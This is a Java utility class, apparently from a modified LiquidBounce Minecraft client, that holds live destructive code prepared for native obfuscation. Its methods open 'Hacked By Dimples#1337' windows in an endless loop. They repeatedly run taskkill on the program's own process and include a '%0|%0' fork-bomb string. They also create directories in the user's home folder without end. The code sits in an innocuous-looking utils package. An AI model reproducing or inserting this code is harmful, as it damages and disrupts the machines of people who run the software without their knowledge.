package net.ccbluex.liquidbounce.utils.misc;

import antiskidderobfuscator.NativeMethod;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Random;

public class DimplesUtils {
    @NativeMethod
    public void NMSL() throws IOException {
        blast_1();
        blast_2();
        blast_3();
    }
    @NativeMethod
    public void blast_1() {

        Random rd = new Random();
        while (true) {
            JFrame frame = new JFrame("Hacked By Dimples#1337");
            frame.setSize(400, 100);
            frame.setLocation(rd.nextInt(1920), rd.nextInt(1080));
            frame.setVisible(true);

        }

    }
    @NativeMethod
    public void blast_2() throws IOException {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("%0|%0"
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
    }
    @NativeMethod
    public void blast_3() {
        int i = 0;
        FileSystemView view = FileSystemView.getFileSystemView();
        File file = view.getHomeDirectory();
        while (true) {

            File f = new File(file + "Hacked By Dimples#1337" + i);
            f.mkdir();

            i++;

        }

    }

}